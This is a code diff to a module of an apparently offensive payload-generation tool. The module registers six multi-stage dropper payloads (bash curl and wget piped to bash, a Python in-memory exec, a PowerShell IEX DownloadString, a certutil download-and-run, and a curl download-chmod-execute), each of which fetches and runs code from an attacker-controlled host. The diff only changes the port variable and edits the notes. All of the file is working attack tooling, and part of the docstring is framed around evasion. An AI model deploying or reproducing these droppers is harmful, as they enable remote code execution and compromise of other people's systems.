@@ -1,71 +1,69 @@
 """Payload chains — multi-stage droppers.
 
 A chain payload is small and inconspicuous; it fetches a second
-payload over HTTP and executes it. Useful for evasion and for
-keeping the initial command short.
+payload over HTTP and executes it. The HTTP server is the one started
+by `serve` (uses `http_port`, default 8080). The listener is separate
+(uses `lport`, default 4444).
 """
 
 from payloadforge.payloads.registry import register
 
-# NOTE: {lhost}:{lport} is your HTTP server (run `serve` to start it).
-# These payloads fetch /stager.sh (or .ps1) from that server and run it.
-
 register(
     "chain_bash_curl",
     "chain", "bash",
-    "curl -s http://{lhost}:{lport}/stager.sh | bash",
+    "curl -s http://{lhost}:{http_port}/stager.sh | bash",
     "Bash dropper — fetches /stager.sh over HTTP and pipes to bash.",
     testable=False,
-    test_note="Requires a running HTTP server (use the 'serve' command) with stager.sh in the docroot.",
+    test_note="Run `serve` with stager.sh in the docroot first.",
     tags=["chain", "dropper", "bash"],
 )
 
 register(
     "chain_bash_wget",
     "chain", "bash",
-    "wget -qO- http://{lhost}:{lport}/stager.sh | bash",
+    "wget -qO- http://{lhost}:{http_port}/stager.sh | bash",
     "wget variant of the bash dropper.",
     testable=False,
-    test_note="Requires running HTTP server with stager.sh.",
+    test_note="Run `serve` with stager.sh in the docroot first.",
     tags=["chain", "dropper", "bash"],
 )
 
 register(
     "chain_python",
     "chain", "python",
-    "python3 -c 'import urllib.request;exec(urllib.request.urlopen(\"http://{lhost}:{lport}/stager.py\").read())'",
+    "python3 -c 'import urllib.request;exec(urllib.request.urlopen(\"http://{lhost}:{http_port}/stager.py\").read())'",
     "Python dropper — fetches and executes /stager.py in memory.",
     testable=False,
-    test_note="Requires running HTTP server with stager.py.",
+    test_note="Run `serve` with stager.py in the docroot first.",
     tags=["chain", "dropper", "python"],
 )
 
 register(
     "chain_powershell",
     "chain", "powershell",
-    "IEX (New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/stager.ps1')",
+    "IEX (New-Object Net.WebClient).DownloadString('http://{lhost}:{http_port}/stager.ps1')",
     "PowerShell dropper — downloads stager.ps1 and executes in memory.",
     testable=False,
-    test_note="Requires running HTTP server with stager.ps1.",
+    test_note="Run `serve` with stager.ps1 in the docroot first. Needs pwsh or Windows.",
     tags=["chain", "dropper", "powershell"],
 )
 
 register(
     "chain_certutil",
     "chain", "cmd",
-    "certutil -urlcache -split -f http://{lhost}:{lport}/p.exe %TEMP%\\p.exe && %TEMP%\\p.exe",
+    "certutil -urlcache -split -f http://{lhost}:{http_port}/p.exe %TEMP%\\p.exe && %TEMP%\\p.exe",
     "Certutil dropper — uses a signed Windows binary to download and run p.exe.",
     testable=False,
-    test_note="Requires running HTTP server with p.exe and a Windows target.",
+    test_note="Windows-only. Run `serve` with p.exe in the docroot.",
     tags=["chain", "dropper", "lolbin", "certutil"],
 )
 
 register(
     "chain_curl_exec",
     "chain", "bash",
-    "curl -s http://{lhost}:{lport}/p -o /tmp/p && chmod +x /tmp/p && /tmp/p",
-    "Curl download-and-execute. Two-stage — file hits disk before running.",
+    "curl -s http://{lhost}:{http_port}/p -o /tmp/p && chmod +x /tmp/p && /tmp/p",
+    "Curl download-and-execute. File hits disk before running.",
     testable=False,
-    test_note="Requires running HTTP server with an executable 'p'.",
+    test_note="Run `serve` with an executable named 'p' in the docroot.",
     tags=["chain", "dropper", "bash"],
 )
